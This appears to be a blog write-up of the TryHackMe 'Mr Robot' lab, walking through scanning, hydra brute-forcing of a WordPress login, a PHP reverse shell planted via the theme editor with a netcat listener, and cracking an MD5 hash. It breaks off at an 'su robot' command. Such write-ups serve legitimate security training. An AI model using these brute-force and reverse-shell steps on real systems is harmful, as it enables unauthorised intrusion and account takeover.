<!doctype html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.3.2" /><meta property="og:title" content="THM:mrrobot" /><meta name="author" content="r0bsec" /><meta property="og:locale" content="en" /><meta name="description" content="mrrobot" /><meta property="og:description" content="mrrobot" /><link rel="canonical" href="https://r0bsec.github.io/writeups/mrrobot/" /><meta property="og:url" content="https://r0bsec.github.io/writeups/mrrobot/" /><meta property="og:site_name" content="r0bsec" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2023-08-17T22:44:52+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="THM:mrrobot" /><meta name="twitter:site" content="@" /><meta name="twitter:creator" content="@r0bsec" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"r0bsec"},"dateModified":"2023-08-17T22:44:52+00:00","datePublished":"2023-08-17T22:44:52+00:00","description":"mrrobot","headline":"THM:mrrobot","mainEntityOfPage":{"@type":"WebPage","@id":"https://r0bsec.github.io/writeups/mrrobot/"},"url":"https://r0bsec.github.io/writeups/mrrobot/"}</script><title>THM:mrrobot | r0bsec</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="r0bsec"><meta name="application-name" content="r0bsec"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.0/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.21.0/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"><body><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper"> <a href="/" id="avatar" class="rounded-circle"> <img src="/assets/img/favicons/favicon-32x32.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"> </a><div class="site-title"> <a href="/">r0bsec</a></div><div class="site-subtitle fst-italic">Cybersecurity fun and games</div></div><ul class="nav flex-column flex-grow-1 w-100 ps-0"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle"></i> <span>ABOUT</span> </a><li class="nav-item"> <a href="/writeups/" class="nav-link"> <i class="fa-fw fas fa-info-circle"></i> <span>WRITEUPS</span> </a></ul><div class="sidebar-bottom d-flex flex-wrap align-items-center w-100"> <a href="https://github.com/r0bsec" aria-label="github" target="_blank" rel="noopener noreferrer" > <i class="fab fa-github"></i> </a> <a href="https://twitter.com/" aria-label="twitter" target="_blank" rel="noopener noreferrer" > <i class="fab fa-twitter"></i> </a> <a href="javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container px-xxl-5"><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100" > <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>THM:mrrobot</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> THM:mrrobot</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..." > </span> <span id="search-cancel">Cancel</span></div></div><div class="row mb-5"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pe-xl-4"><div class="post px-1 px-md-2"><h1 class="dynamic-title"> THM:mrrobot</h1><div class="post-content"><p>mrrobot</p><p>URL: <a href="https://tryhackme.com/room/mrrobot">https://tryhackme.com/room/mrrobot</a> [Medium]</p><hr /><h2 id="reconnaissance"><span class="me-2">Reconnaissance</span><a href="#reconnaissance" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Description of the room:</p><blockquote><p>Based on the Mr. Robot show, can you root this box?</p></blockquote><h2 id="scanning"><span class="me-2">Scanning</span><a href="#scanning" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="running-nmap"><span class="me-2">Running: <code class="language-plaintext highlighter-rouge">nmap</code></span><a href="#running-nmap" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Ran the following:</p><blockquote><p><code class="language-plaintext highlighter-rouge">nmap -sCV x.x.x.x</code></p></blockquote><p>Interesting ports found to be open:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="n">PORT</span>    <span class="n">STATE</span>  <span class="n">SERVICE</span>  <span class="n">VERSION</span>
<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span>  <span class="n">closed</span> <span class="n">ssh</span>
<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>   <span class="n">http</span>     <span class="n">Apache</span> <span class="n">httpd</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="n">Site</span> <span class="n">doesn</span><span class="sh">'</span><span class="s">t have a title (text/html).
|_http-server-header: Apache
443/tcp open   ssl/http Apache httpd
|_http-server-header: Apache
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
|_http-title: Site doesn</span><span class="sh">'</span><span class="n">t</span> <span class="n">have</span> <span class="n">a</span> <span class="nf">title </span><span class="p">(</span><span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">).</span>
</pre></table></code></div></div><p>Also see: <a href="nmap.log">nmap.log</a></p><h3 id="running-gobuster"><span class="me-2">Running: <code class="language-plaintext highlighter-rouge">gobuster</code></span><a href="#running-gobuster" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Ran the following:</p><blockquote><p><code class="language-plaintext highlighter-rouge">gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://x.x.x.x</code></p></blockquote><p>Interesting folders found:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="o">/</span><span class="nf">blog                 </span><span class="p">(</span><span class="n">Status</span><span class="p">:</span> <span class="mi">301</span><span class="p">)</span> <span class="p">[</span><span class="n">Size</span><span class="p">:</span> <span class="mi">233</span><span class="p">]</span> <span class="p">[</span><span class="o">--&gt;</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10</span><span class="p">.</span><span class="mf">39.226</span><span class="o">/</span><span class="n">blog</span><span class="o">/</span><span class="p">]</span>
<span class="o">/</span><span class="nf">sitemap              </span><span class="p">(</span><span class="n">Status</span><span class="p">:</span> <span class="mi">200</span><span class="p">)</span> <span class="p">[</span><span class="n">Size</span><span class="p">:</span> <span class="mi">0</span><span class="p">]</span>
<span class="o">/</span><span class="nf">login                </span><span class="p">(</span><span class="n">Status</span><span class="p">:</span> <span class="mi">302</span><span class="p">)</span> <span class="p">[</span><span class="n">Size</span><span class="p">:</span> <span class="mi">0</span><span class="p">]</span> <span class="p">[</span><span class="o">--&gt;</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10</span><span class="p">.</span><span class="mf">39.226</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">login</span><span class="p">.</span><span class="n">php</span><span class="p">]</span>
<span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="nf">content           </span><span class="p">(</span><span class="n">Status</span><span class="p">:</span> <span class="mi">301</span><span class="p">)</span> <span class="p">[</span><span class="n">Size</span><span class="p">:</span> <span class="mi">239</span><span class="p">]</span> <span class="p">[</span><span class="o">--&gt;</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10</span><span class="p">.</span><span class="mf">39.226</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">content</span><span class="o">/</span><span class="p">]</span>
<span class="o">/</span><span class="nf">admin                </span><span class="p">(</span><span class="n">Status</span><span class="p">:</span> <span class="mi">301</span><span class="p">)</span> <span class="p">[</span><span class="n">Size</span><span class="p">:</span> <span class="mi">234</span><span class="p">]</span> <span class="p">[</span><span class="o">--&gt;</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10</span><span class="p">.</span><span class="mf">39.226</span><span class="o">/</span><span class="n">admin</span><span class="o">/</span><span class="p">]</span>
<span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="nf">login             </span><span class="p">(</span><span class="n">Status</span><span class="p">:</span> <span class="mi">200</span><span class="p">)</span> <span class="p">[</span><span class="n">Size</span><span class="p">:</span> <span class="mi">2606</span><span class="p">]</span>
<span class="o">/</span><span class="nf">robots               </span><span class="p">(</span><span class="n">Status</span><span class="p">:</span> <span class="mi">200</span><span class="p">)</span> <span class="p">[</span><span class="n">Size</span><span class="p">:</span> <span class="mi">41</span><span class="p">]</span>
<span class="o">/</span><span class="nf">dashboard            </span><span class="p">(</span><span class="n">Status</span><span class="p">:</span> <span class="mi">302</span><span class="p">)</span> <span class="p">[</span><span class="n">Size</span><span class="p">:</span> <span class="mi">0</span><span class="p">]</span> <span class="p">[</span><span class="o">--&gt;</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10</span><span class="p">.</span><span class="mf">39.226</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">admin</span><span class="o">/</span><span class="p">]</span>
<span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="nf">admin             </span><span class="p">(</span><span class="n">Status</span><span class="p">:</span> <span class="mi">301</span><span class="p">)</span> <span class="p">[</span><span class="n">Size</span><span class="p">:</span> <span class="mi">237</span><span class="p">]</span> <span class="p">[</span><span class="o">--&gt;</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10</span><span class="p">.</span><span class="mf">39.226</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">admin</span><span class="o">/</span><span class="p">]</span>
<span class="o">/</span><span class="nf">phpmyadmin           </span><span class="p">(</span><span class="n">Status</span><span class="p">:</span> <span class="mi">403</span><span class="p">)</span> <span class="p">[</span><span class="n">Size</span><span class="p">:</span> <span class="mi">94</span><span class="p">]</span><span class="sb">``</span><span class="err">`</span>
</pre></table></code></div></div><p>Also see: <a href="gobuster.log">gobuster.log</a></p><h3 id="running-nikto"><span class="me-2">Running: <code class="language-plaintext highlighter-rouge">nikto</code></span><a href="#running-nikto" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Ran the following:</p><blockquote><p><code class="language-plaintext highlighter-rouge">nikto -h x.x.x.x</code></p></blockquote><p>Interesting info found:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="o">+</span> <span class="n">Server</span><span class="p">:</span> <span class="n">Apache</span>
<span class="o">+</span> <span class="o">/</span><span class="p">:</span> <span class="n">The</span> <span class="n">X</span><span class="o">-</span><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="o">-</span><span class="n">Options</span> <span class="n">header</span> <span class="ow">is</span> <span class="ow">not</span> <span class="nb">set</span><span class="p">.</span> <span class="n">This</span> <span class="n">could</span> <span class="n">allow</span> <span class="n">the</span> <span class="n">user</span> <span class="n">agent</span> <span class="n">to</span> <span class="n">render</span> <span class="n">the</span> <span class="n">content</span> <span class="n">of</span> <span class="n">the</span> <span class="n">site</span> <span class="ow">in</span> <span class="n">a</span> <span class="n">different</span> <span class="n">fashion</span> <span class="n">to</span> <span class="n">the</span> <span class="n">MIME</span> <span class="nb">type</span><span class="p">.</span> <span class="n">See</span><span class="p">:</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="p">.</span><span class="n">netsparker</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">web</span><span class="o">-</span><span class="n">vulnerability</span><span class="o">-</span><span class="n">scanner</span><span class="o">/</span><span class="n">vulnerabilities</span><span class="o">/</span><span class="n">missing</span><span class="o">-</span><span class="n">content</span><span class="o">-</span><span class="nb">type</span><span class="o">-</span><span class="n">header</span><span class="o">/</span>
<span class="o">+</span> <span class="o">/</span><span class="n">ODyr7ymu</span><span class="p">.</span><span class="n">pt</span><span class="p">:</span> <span class="n">Retrieved</span> <span class="n">x</span><span class="o">-</span><span class="n">powered</span><span class="o">-</span><span class="n">by</span> <span class="n">header</span><span class="p">:</span> <span class="n">PHP</span><span class="o">/</span><span class="mf">5.5</span><span class="p">.</span><span class="mf">29.</span>
<span class="o">+</span> <span class="n">No</span> <span class="n">CGI</span> <span class="n">Directories</span> <span class="nf">found </span><span class="p">(</span><span class="n">use</span> <span class="sh">'</span><span class="s">-C all</span><span class="sh">'</span> <span class="n">to</span> <span class="n">force</span> <span class="n">check</span> <span class="nb">all</span> <span class="n">possible</span> <span class="n">dirs</span><span class="p">)</span>
<span class="o">+</span> <span class="o">/</span><span class="n">index</span><span class="p">:</span> <span class="n">Uncommon</span> <span class="n">header</span> <span class="sh">'</span><span class="s">tcn</span><span class="sh">'</span> <span class="n">found</span><span class="p">,</span> <span class="k">with</span> <span class="n">contents</span><span class="p">:</span> <span class="nb">list</span><span class="p">.</span>
<span class="o">+</span> <span class="o">/</span><span class="n">index</span><span class="p">:</span> <span class="n">Apache</span> <span class="n">mod_negotiation</span> <span class="ow">is</span> <span class="n">enabled</span> <span class="k">with</span> <span class="n">MultiViews</span><span class="p">,</span> <span class="n">which</span> <span class="n">allows</span> <span class="n">attackers</span> <span class="n">to</span> <span class="n">easily</span> <span class="n">brute</span> <span class="n">force</span> <span class="nb">file</span> <span class="n">names</span><span class="p">.</span> <span class="n">The</span> <span class="n">following</span> <span class="n">alternatives</span> <span class="k">for</span> <span class="sh">'</span><span class="s">index</span><span class="sh">'</span> <span class="n">were</span> <span class="n">found</span><span class="p">:</span> <span class="n">index</span><span class="p">.</span><span class="n">html</span><span class="p">,</span> <span class="n">index</span><span class="p">.</span><span class="n">php</span><span class="p">.</span> <span class="n">See</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="p">.</span><span class="n">wisec</span><span class="p">.</span><span class="n">it</span><span class="o">/</span><span class="n">sectou</span><span class="p">.</span><span class="n">php</span><span class="err">?</span><span class="nb">id</span><span class="o">=</span><span class="mi">4698</span><span class="n">ebdc59d15</span><span class="p">,</span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">exchange</span><span class="p">.</span><span class="n">xforce</span><span class="p">.</span><span class="n">ibmcloud</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">vulnerabilities</span><span class="o">/</span><span class="mi">8275</span>
</pre></table></code></div></div><p>Also see: <a href="nikto.log">nikto.log</a></p><h3 id="running-hydra"><span class="me-2">Running: <code class="language-plaintext highlighter-rouge">hydra</code></span><a href="#running-hydra" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Two tips, here. I watched the walkthrough. In the comments, <a href="https://www.youtube.com/watch?v=BQ4xeeNAbaw&amp;lc=Ugzghp1izjb5LPs9WQx4AaABAg">someone mentioned a way</a> to make this processing a bit faster by re-organizing the contents of the wordlist file (which has ~1 million records). I ran:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="c"># Gets all duplicate lines</span>
<span class="nb">sort</span> ./fsocity.dic | <span class="nb">uniq</span> <span class="nt">-d</span> <span class="o">&gt;</span> new.txt

<span class="c"># Append all unique lines</span>
<span class="nb">sort</span> ./fsocity.dic | <span class="nb">uniq</span> <span class="nt">-u</span> <span class="o">&gt;&gt;</span> new.txt
</pre></table></code></div></div><p>This does get rid of a lot of noise. This merely concatenates the: unique lines plus the unique values where there were multiple entries. Makes a big difference in the number of lines in our wordlist. On my workstation, I was getting between 845 and 1,745 attempts per minute. So, doing the math, here’s how long this might take:</p><div class="table-wrapper"><table><thead><tr><th>File<th style="text-align: right">Size<th style="text-align: right">Lines<th style="text-align: center">Est (@845/min)<th style="text-align: center">Est (@1745/min)<tbody><tr><td><code class="language-plaintext highlighter-rouge">fsocity.dic</code><td style="text-align: right">7,075 KB<td style="text-align: right">858,160<td style="text-align: center">17 hrs<td style="text-align: center">8 hrs<tr><td><code class="language-plaintext highlighter-rouge">new.txt</code><td style="text-align: right">94 KB<td style="text-align: right">11,451<td style="text-align: center">13 mins<td style="text-align: center">6.5 mins</table></div><p>So, <code class="language-plaintext highlighter-rouge">new.txt</code> is the reorganized file I’ll be working with. Next, I didn’t really think of this. I was assuming based on the TV show, the username might be “elliot”. However, since this Wordpress installation shows verbose messages, we can use <code class="language-plaintext highlighter-rouge">hydra</code> to test for possible usernames and for possible passwords.</p><p>You might remember for Hydra that:</p><fieldset> <legend>Hydra Arguments</legend><dl><dt><code>-L</code><dd>Use a wordlist for the username (e.g. <code>hydra -L ./wordlist.txt ...</code>).<dt><code>-l</code><dd>Use a single, specific username (e.g. <code>hydra -l jdoe ...</code>).<dt><code>-P</code><dd>Use a wordlist for the password (e.g. <code>hydra -P ./wordlist.txt ...</code>).<dt><code>-p</code><dd>Use a single, specific password (e.g. <code>hydra -p password ...</code>)</dl></fieldset><h4 id="hydra-for-usernames"><span class="me-2">Hydra for usernames</span><a href="#hydra-for-usernames" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Keeping that in mind, we want to first use a <strong>fixed password</strong> and our <strong>wordlist for potential usernames</strong>:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>hydra <span class="nt">-L</span> ./new.txt <span class="nt">-p</span> <span class="nb">test</span> <span class="se">\</span>
    <span class="nv">$TARGET</span> http-post-form <span class="se">\</span>
    <span class="s2">"/wp-login.php:log=^USER^&amp;pwd=^PASS^:Invalid username"</span> <span class="nt">-I</span> 2&gt;&amp;1 | <span class="nb">tee</span> <span class="nv">$ROOM</span>/hydra-usernames.log
</pre></table></code></div></div><h4 id="hydra-for-passwords"><span class="me-2">Hydra for passwords</span><a href="#hydra-for-passwords" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>From this effort, we see the username “Elliot” in various casing, so it’s probably case-insenstive. Now, let’s flip it around, use <strong>“elliot” for a username</strong> and the <strong>wordlist for the password</strong>:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>hydra <span class="nt">-l</span> elliot <span class="nt">-P</span> ./new.txt <span class="se">\ </span>    
    <span class="nv">$TARGET</span> http-post-form <span class="se">\</span>
    <span class="s2">"/wp-login.php:log=^USER^&amp;pwd=^PASS^:The password you entered"</span> <span class="nt">-I</span> 2&gt;&amp;1 | <span class="nb">tee</span> <span class="nv">$ROOM</span>/hydra-passwords.log
</pre></table></code></div></div><p>It took about :15 minutes but we were able to get the password:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>Hydra v9.5 <span class="o">(</span>c<span class="o">)</span> 2023 by van Hauser/THC &amp; David Maciejak - Please <span class="k">do </span>not use <span class="k">in </span>military or secret service organizations, or <span class="k">for </span>illegal purposes <span class="o">(</span>this is non-binding, these <span class="k">***</span> ignore laws and ethics anyway<span class="o">)</span><span class="nb">.</span>

Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> starting at 2023-08-12 23:14:38
<span class="o">[</span>DATA] max 30 tasks per 1 server, overall 30 tasks, 11452 login tries <span class="o">(</span>l:1/p:11452<span class="o">)</span>, ~382 tries per task
<span class="o">[</span>DATA] attacking http-post-form://10.10.83.180:80/wp-login.php:log<span class="o">=</span>^USER^&amp;pwd<span class="o">=</span>^PASS^:The password you entered
<span class="o">[</span>STATUS] 1745.00 tries/min, 1745 tries <span class="k">in </span>00:01h, 9707 to <span class="k">do in </span>00:06h, 30 active
<span class="o">[</span>STATUS] 1136.67 tries/min, 3410 tries <span class="k">in </span>00:03h, 8042 to <span class="k">do in </span>00:08h, 30 active
<span class="o">[</span>STATUS] 845.00 tries/min, 5915 tries <span class="k">in </span>00:07h, 5537 to <span class="k">do in </span>00:07h, 30 active
<span class="o">[</span>STATUS] 723.67 tries/min, 8684 tries <span class="k">in </span>00:12h, 2768 to <span class="k">do in </span>00:04h, 30 active
<span class="o">[</span>80][http-post-form] host: 10.10.83.180   login: elliot   password: <span class="k">*********</span>
1 of 1 target successfully completed, 1 valid password found
Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> finished at 2023-08-12 23:31:30
</pre></table></code></div></div><p>Also see: <a href="hydra-usernames.log">hydra-usernames.log</a> and <a href="hydra-passwords.log">hydra-passwords.log</a>.</p><h2 id="gaining-access"><span class="me-2">Gaining Access</span><a href="#gaining-access" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We can now log into this Wordpress site as “elliot”. One way to exploit this access is to navigate to the browser-based file editor for the “archive.php”: <code class="language-plaintext highlighter-rouge">/wp-admin/theme-editor.php?file=archive.php</code></p><p>Since this is not a heavily used page, you could replace the contents with a <a href="https://github.com/pentestmonkey/php-reverse-shell">PHP Reverse Shell</a> remembering to change the IP and port to your workstation. Save your changes. For example, you run <code class="language-plaintext highlighter-rouge">netcat</code> to listen for the incoming connection on port <code class="language-plaintext highlighter-rouge">9000</code>:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="c"># Listen for incoming connections...</span>
nc <span class="nt">-lvnp</span> 9000
</pre></table></code></div></div><p>Lastly, navigate to: <code class="language-plaintext highlighter-rouge">/wp-content/themes/twentyfifteen/archive.php</code> to initiate the reverse shell back to your workstation. You should see something like this in the window that was running <code class="language-plaintext highlighter-rouge">netcat</code>:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>listening on <span class="o">[</span>any] 9000 ...
connect to <span class="o">[</span>10.6.78.155] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.83.180] 47920
Linux linux 3.13.0-55-generic <span class="c">#94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux</span>
 03:39:26 up 27 min,  0 <span class="nb">users</span>,  load average: 0.00, 1.05, 2.06
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
<span class="nv">uid</span><span class="o">=</span>1<span class="o">(</span>daemon<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1<span class="o">(</span>daemon<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1<span class="o">(</span>daemon<span class="o">)</span>
/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
$
</span></pre></table></code></div></div><p>We can slightly upgrade our prompt with:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
</pre></table></code></div></div><h3 id="unprivileged-access"><span class="me-2">Unprivileged Access</span><a href="#unprivileged-access" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>We now have a primitive prompt running as the <code class="language-plaintext highlighter-rouge">daemon</code> user. This user doesn’t have any <code class="language-plaintext highlighter-rouge">sudo -l</code> privilege, doesn’t have a home directory and can’t do much.</p><p>We can look and see we have access to the <code class="language-plaintext highlighter-rouge">/home/robot</code> directory. Within there we have access to 1 of the 2 files:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>drwxr-xr-x 2 root  root  4096 Nov 13  2015 <span class="nb">.</span>
drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
<span class="nt">-r--------</span> 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
<span class="nt">-rw-r--r--</span> 1 robot robot   39 Nov 13  2015 password.raw-md5
</pre></table></code></div></div><p>If we grab the contents of that MD5 file which has <code class="language-plaintext highlighter-rouge">user:password</code> format and the username specified as <code class="language-plaintext highlighter-rouge">robot</code>, we can use a website like: <a href="https://hashes.com/en/decrypt/hash">https://hashes.com/en/decrypt/hash</a> to see if it’s a know message digest. It IS! That means we might have the password for the <code class="language-plaintext highlighter-rouge">robot</code> account. Let’s see:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>su robot
